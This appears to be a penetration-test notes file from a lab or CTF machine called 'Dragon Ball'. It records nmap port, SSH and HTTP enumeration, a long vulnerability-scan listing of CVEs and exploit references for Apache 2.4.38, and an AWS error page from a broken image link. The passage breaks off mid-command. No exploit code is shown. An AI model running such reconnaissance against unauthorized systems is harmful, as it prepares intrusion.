# Dragon Ball Notes

In this file, there are all bunch of notes and attempts to exploit this machine

## Analysis

### nmap

nmap -p- -T4 10.0.0.34
```
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 15:30 EST
    Nmap scan report for 10.0.0.34
    Host is up (0.012s latency).
    Not shown: 65533 closed tcp ports (reset)
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
```

#### Port 22 - SSH

nmap -p 22 --script=banner 10.0.0.34
```    
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 15:32 EST
    Nmap scan report for 10.0.0.34
    Host is up (0.013s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh
    |_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2

    Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

nmap -p 22 --script=ssh-hostkey,ssh-auth-methods,ssh2-enum-algos 10.0.0.34
```
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 15:32 EST
    Nmap scan report for 10.0.0.34
    Host is up (0.013s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh
    | ssh-hostkey: 
    |   2048 b5:77:4c:88:d7:27:54:1c:56:1d:48:d9:a4:1e:28:91 (RSA)
    |   256 c6:a8:c8:9e:ed:0d:67:1f:ae:ad:6b:d5:dd:f1:57:a1 (ECDSA)
    |_  256 fa:a9:b0:e3:06:2b:92:63:ba:11:2f:94:d6:31:90:b2 (ED25519)
    | ssh-auth-methods: 
    |   Supported authentication methods: 
    |     publickey
    |_    password
    | ssh2-enum-algos: 
    |   kex_algorithms: (10)
    |       curve25519-sha256
    |       curve25519-sha256@libssh.org
    |       ecdh-sha2-nistp256
    |       ecdh-sha2-nistp384
    |       ecdh-sha2-nistp521
    |       diffie-hellman-group-exchange-sha256
    |       diffie-hellman-group16-sha512
    |       diffie-hellman-group18-sha512
    |       diffie-hellman-group14-sha256
    |       diffie-hellman-group14-sha1
    |   server_host_key_algorithms: (5)
    |       rsa-sha2-512
    |       rsa-sha2-256
    |       ssh-rsa
    |       ecdsa-sha2-nistp256
    |       ssh-ed25519
    |   encryption_algorithms: (6)
    |       chacha20-poly1305@openssh.com
    |       aes128-ctr
    |       aes192-ctr
    |       aes256-ctr
    |       aes128-gcm@openssh.com
    |       aes256-gcm@openssh.com
    |   mac_algorithms: (10)
    |       umac-64-etm@openssh.com
    |       umac-128-etm@openssh.com
    |       hmac-sha2-256-etm@openssh.com
    |       hmac-sha2-512-etm@openssh.com
    |       hmac-sha1-etm@openssh.com
    |       umac-64@openssh.com
    |       umac-128@openssh.com
    |       hmac-sha2-256
    |       hmac-sha2-512
    |       hmac-sha1
    |   compression_algorithms: (2)
    |       none
    |_      zlib@openssh.com

    Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
```

#### Port 80 - HTTP

nmap -sV -p 80 --script=http-title,http-server-header,http-robots.txt,http-headers,http-methods,http-enum 10.0.0.34
```
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 15:35 EST
    Nmap scan report for 10.0.0.34
    Host is up (0.012s latency).

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-title: DRAGON BALL | Aj's
    | http-methods: 
    |_  Supported Methods: GET POST OPTIONS HEAD
    | http-headers: 
    |   Date: Tue, 22 Oct 2024 10:29:36 GMT
    |   Server: Apache/2.4.38 (Debian)
    |   Last-Modified: Tue, 05 Jan 2021 16:14:16 GMT
    |   ETag: "1103-5b8297f8e741b"
    |   Accept-Ranges: bytes
    |   Content-Length: 4355
    |   Vary: Accept-Encoding
    |   Connection: close
    |   Content-Type: text/html
    |   
    |_  (Request type: HEAD)
    |_http-server-header: Apache/2.4.38 (Debian)
    | http-enum: 
    |_  /robots.txt: Robots file

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds
```

Details nmap that looks for known vulnerabilities and CVE's

sudo nmap -sV --script=vuln -p 80 10.0.0.34
```
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 18:50 EST
    Nmap scan report for 10.0.0.34
    Host is up (0.014s latency).

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
    |_http-server-header: Apache/2.4.38 (Debian)
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.38: 
    |       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
    |       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
    |       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
    |       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
    |       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
    |       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
    |       HTTPD:9AD76A782F4E66676719E36B64777A7A  9.8     https://vulners.com/httpd/HTTPD:9AD76A782F4E66676719E36B64777A7A
    |       HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E  9.8     https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
    |       HTTPD:126D03F016241FBEDC0253722047ACEA  9.8     https://vulners.com/httpd/HTTPD:126D03F016241FBEDC0253722047ACEA
    |       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
    |       D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52    9.8     https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52  *EXPLOIT*
    |       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
    |       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
    |       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
    |       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
    |       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
    |       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
    |       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
    |       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
    |       CVE-2021-26691  9.8     https://vulners.com/cve/CVE-2021-26691
    |       CVE-2020-11984  9.8     https://vulners.com/cve/CVE-2020-11984
    |       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
    |       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
    |       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
    |       CNVD-2022-41640 9.8     https://vulners.com/cnvd/CNVD-2022-41640
    |       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
    |       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
    |       CNVD-2020-46280 9.8     https://vulners.com/cnvd/CNVD-2020-46280
    |       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C  *EXPLOIT*
    |       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
    |       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
    |       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
    |       1337DAY-ID-38427        9.8     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
    |       1337DAY-ID-34882        9.8     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT*
    |       HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6  9.1     https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
    |       HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF  9.1     https://vulners.com/httpd/HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF
    |       HTTPD:2C227652EE0B3B961706AAFCACA3D1E1  9.1     https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
    |       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F  *EXPLOIT*
    |       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7  *EXPLOIT*
    |       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
    |       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45  *EXPLOIT*
    |       CVE-2025-23048  9.1     https://vulners.com/cve/CVE-2025-23048
    |       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
    |       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
    |       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
    |       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
    |       CVE-2019-10082  9.1     https://vulners.com/cve/CVE-2019-10082
    |       CNVD-2025-16610 9.1     https://vulners.com/cnvd/CNVD-2025-16610
    |       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
    |       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
    |       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
    |       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
    |       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
    |       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A  *EXPLOIT*
    |       HTTPD:1B3D546A8500818AAC5B1359FE11A7E4  9.0     https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
    |       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    9.0     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
    |       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
    |       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
    |       CNVD-2023-30860 9.0     https://vulners.com/cnvd/CNVD-2023-30860
    |       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
    |       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C  *EXPLOIT*
    |       9D9B3F4D-6B5C-5377-BE39-F1C432C9E457    9.0     https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457  *EXPLOIT*
    |       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
    |       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2  *EXPLOIT*
    |       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F  *EXPLOIT*
    |       D6E5CEC7-9ED8-5F96-A93E-768E2674DBCB    8.8     https://vulners.com/githubexploit/D6E5CEC7-9ED8-5F96-A93E-768E2674DBCB  *EXPLOIT*
    |       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
    |       HTTPD:A7133572D328CD65C350E33F20834FAD  8.2     https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
    |       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
    |       CNVD-2021-102387        8.2     https://vulners.com/cnvd/CNVD-2021-102387
    |       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
    |       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
    |       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
    |       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
    |       HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65  7.8     https://vulners.com/httpd/HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65
    |       HTTPD:109158785130C454EF1D1CDDD4417560  7.8     https://vulners.com/httpd/HTTPD:109158785130C454EF1D1CDDD4417560
    |       EDB-ID:46676    7.8     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
    |       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041  *EXPLOIT*
    |       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
    |       CVE-2019-0211   7.8     https://vulners.com/cve/CVE-2019-0211
    |       CNVD-2019-08946 7.8     https://vulners.com/cnvd/CNVD-2019-08946
    |       706A08EF-16F2-59B5-B98E-EB8B83215AB1    7.8     https://vulners.com/gitee/706A08EF-16F2-59B5-B98E-EB8B83215AB1  *EXPLOIT*
    |       PACKETSTORM:211124      7.5     https://vulners.com/packetstorm/PACKETSTORM:211124      *EXPLOIT*
    |       HTTPD:F6C47B71D440F1A5B8EC9883D1516A33  7.5     https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
    |       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
    |       HTTPD:D9B9375C40939357C5F47F1B3F64F0A1  7.5     https://vulners.com/httpd/HTTPD:D9B9375C40939357C5F47F1B3F64F0A1
    |       HTTPD:CEEECD1BF3428B58C39137059390E4A1  7.5     https://vulners.com/httpd/HTTPD:CEEECD1BF3428B58C39137059390E4A1
    |       HTTPD:C7D6319965E27EC08FB443D1FD67603B  7.5     https://vulners.com/httpd/HTTPD:C7D6319965E27EC08FB443D1FD67603B
    |       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
    |       HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F  7.5     https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
    |       HTTPD:B1B0A31C4AD388CC6C575931414173E2  7.5     https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
    |       HTTPD:975FD708E753E143E7DFFC23510F802E  7.5     https://vulners.com/httpd/HTTPD:975FD708E753E143E7DFFC23510F802E
    |       HTTPD:8D3D8562E77EAD24FA6850949D025BC9  7.5     https://vulners.com/httpd/HTTPD:8D3D8562E77EAD24FA6850949D025BC9
    |       HTTPD:720B7778CA309E929672897731D4493B  7.5     https://vulners.com/httpd/HTTPD:720B7778CA309E929672897731D4493B
    |       HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5  7.5     https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
    |       HTTPD:05E6BF2AD317E3658D2938931207AA66  7.5     https://vulners.com/httpd/HTTPD:05E6BF2AD317E3658D2938931207AA66
    |       EDB-ID:52426    7.5     https://vulners.com/exploitdb/EDB-ID:52426      *EXPLOIT*
    |       EDB-ID:40909    7.5     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT*
    |       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
    |       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
    |       D228B59B-465A-509D-A681-012DB9348698    7.5     https://vulners.com/githubexploit/D228B59B-465A-509D-A681-012DB9348698  *EXPLOIT*
    |       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
    |       CVE-2025-49630  7.5     https://vulners.com/cve/CVE-2025-49630
    |       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
    |       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
    |       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
    |       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
    |       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
    |       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
    |       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
    |       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
    |       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
    |       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
    |       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
    |       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
    |       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
    |       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
    |       CVE-2021-36160  7.5     https://vulners.com/cve/CVE-2021-36160
    |       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
    |       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
    |       CVE-2021-26690  7.5     https://vulners.com/cve/CVE-2021-26690
    |       CVE-2020-9490   7.5     https://vulners.com/cve/CVE-2020-9490
    |       CVE-2020-11993  7.5     https://vulners.com/cve/CVE-2020-11993
    |       CVE-2019-10081  7.5     https://vulners.com/cve/CVE-2019-10081
    |       CVE-2019-0217   7.5     https://vulners.com/cve/CVE-2019-0217
    |       CVE-2019-0215   7.5     https://vulners.com/cve/CVE-2019-0215
    |       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
    |       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
    |       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
    |       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
    |       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
    |       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
    |       CNVD-2025-16603 7.5     https://vulners.com/cnvd/CNVD-2025-16603
    |       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
    |       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
    |       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
    |       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
    |       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
    |       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
    |       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
    |       CNVD-2022-51058 7.5     https://vulners.com/cnvd/CNVD-2022-51058
    |       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
    |       CNVD-2022-13199 7.5     https://vulners.com/cnvd/CNVD-2022-13199
    |       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
    |       CNVD-2022-03205 7.5     https://vulners.com/cnvd/CNVD-2022-03205
    |       CNVD-2020-46281 7.5     https://vulners.com/cnvd/CNVD-2020-46281
    |       CNVD-2020-46279 7.5     https://vulners.com/cnvd/CNVD-2020-46279
    |       CNVD-2019-08945 7.5     https://vulners.com/cnvd/CNVD-2019-08945
    |       CNVD-2016-12036 7.5     https://vulners.com/cnvd/CNVD-2016-12036
    |       CNVD-2016-04600 7.5     https://vulners.com/cnvd/CNVD-2016-04600
    |       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
    |       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
    |       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
    |       A6687F08-B033-5AE7-84F5-DE799491DA2F    7.5     https://vulners.com/githubexploit/A6687F08-B033-5AE7-84F5-DE799491DA2F  *EXPLOIT*
    |       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
    |       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629  *EXPLOIT*
    |       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
    |       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
    |       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
    |       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
    |       135C45BD-4652-5EEE-8890-2D3C62709016    7.5     https://vulners.com/githubexploit/135C45BD-4652-5EEE-8890-2D3C62709016  *EXPLOIT*
    |       1337DAY-ID-35422        7.5     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
    |       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
    |       HTTPD:D66D5F45690EBE82B48CC81EF6388EE8  7.3     https://vulners.com/httpd/HTTPD:D66D5F45690EBE82B48CC81EF6388EE8
    |       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
    |       CVE-2020-35452  7.3     https://vulners.com/cve/CVE-2020-35452
    |       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
    |       HTTPD:1476868F8E61526B31CAA5707DE2E715  7.2     https://vulners.com/httpd/HTTPD:1476868F8E61526B31CAA5707DE2E715
    |       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
    |       CVE-2019-10097  7.2     https://vulners.com/cve/CVE-2019-10097
    |       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
    |       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
    |       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
    |       HTTPD:E3E8BE7E36621C4506552BA051ECC3C8  6.1     https://vulners.com/httpd/HTTPD:E3E8BE7E36621C4506552BA051ECC3C8
    |       HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6  6.1     https://vulners.com/httpd/HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6
    |       HTTPD:5FF2D6B51D8115FFCB653949D8D36345  6.1     https://vulners.com/httpd/HTTPD:5FF2D6B51D8115FFCB653949D8D36345
    |       CVE-2020-1927   6.1     https://vulners.com/cve/CVE-2020-1927
    |       CVE-2019-10098  6.1     https://vulners.com/cve/CVE-2019-10098
    |       CVE-2019-10092  6.1     https://vulners.com/cve/CVE-2019-10092
    |       CNVD-2020-21904 6.1     https://vulners.com/cnvd/CNVD-2020-21904
    |       CAB023BA-58A3-5C35-BF97-F9C43133DB5E    6.1     https://vulners.com/gitee/CAB023BA-58A3-5C35-BF97-F9C43133DB5E  *EXPLOIT*
    |       4013EC74-B3C1-5D95-938A-54197A58586D    6.1     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
    |       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
    |       CNVD-2018-20078 5.9     https://vulners.com/cnvd/CNVD-2018-20078
    |       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
    |       HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05  5.5     https://vulners.com/httpd/HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05
    |       CVE-2020-13938  5.5     https://vulners.com/cve/CVE-2020-13938
    |       CNVD-2021-44765 5.5     https://vulners.com/cnvd/CNVD-2021-44765
    |       HTTPD:FCCF5DB14D66FA54B47C34D9680C0335  5.3     https://vulners.com/httpd/HTTPD:FCCF5DB14D66FA54B47C34D9680C0335
    |       HTTPD:EB26BC6B6E566C865F53A311FC1A6744  5.3     https://vulners.com/httpd/HTTPD:EB26BC6B6E566C865F53A311FC1A6744
    |       HTTPD:BAAB4065D254D64A717E8A5C847C7BCA  5.3     https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
    |       HTTPD:AA09285A8811F9F8A1F82F45122331AD  5.3     https://vulners.com/httpd/HTTPD:AA09285A8811F9F8A1F82F45122331AD
    |       HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F  5.3     https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
    |       HTTPD:5C8B0394DE17D1C29719B16CE00F475D  5.3     https://vulners.com/httpd/HTTPD:5C8B0394DE17D1C29719B16CE00F475D
    |       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
    |       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
    |       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
    |       CVE-2020-1934   5.3     https://vulners.com/cve/CVE-2020-1934
    |       CVE-2019-17567  5.3     https://vulners.com/cve/CVE-2019-17567
    |       CVE-2019-0220   5.3     https://vulners.com/cve/CVE-2019-0220
    |       CVE-2019-0196   5.3     https://vulners.com/cve/CVE-2019-0196
    |       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
    |       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
    |       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
    |       CNVD-2021-44766 5.3     https://vulners.com/cnvd/CNVD-2021-44766
    |       CNVD-2020-46278 5.3     https://vulners.com/cnvd/CNVD-2020-46278
    |       CNVD-2020-29872 5.3     https://vulners.com/cnvd/CNVD-2020-29872
    |       CNVD-2019-08941 5.3     https://vulners.com/cnvd/CNVD-2019-08941
    |       CNVD-2019-02938 5.3     https://vulners.com/cnvd/CNVD-2019-02938
    |       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
    |       HTTPD:2F7A93926BF5E6C2E4D1EFB6F2BEEE01  4.9     https://vulners.com/httpd/HTTPD:2F7A93926BF5E6C2E4D1EFB6F2BEEE01
    |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
    |       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
    |       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
    |_      1337DAY-ID-26497        0.0     https://vulners.com/zdt/1337DAY-ID-26497        *EXPLOIT*
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |_  /robots.txt: Robots file

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 38.93 seconds
```

### HTTP Analysis

#### Not loadable images

From doing the request using the url into the browser directly

https://media.comicbook.com/2016/10/dragon-ball-207988.jpg
```
<Error>
    <Code>
        InvalidAccessKeyId
    </Code>
    <Message>
        The AWS Access Key Id you provided does not exist in our records.
    </Message>
    <AWSAccessKeyId>
        AKIAZ7BZNBUOGAOWXUHG
    </AWSAccessKeyId>
    <RequestId>
        BF0HSE2X7ENJ3SFA
    </RequestId>
    <HostId>
        RV2fKkCKcDcpatWXwFE6nKICzTj824ZFUPprpu90X1SFAlr62xG8e5QoYvSjwqK7C/hB26hE3xY=
    </HostId>
</Error>
```

curl 'https://media.comicbook.com/2016/10/dragon-ball-z-207987.jpg' \
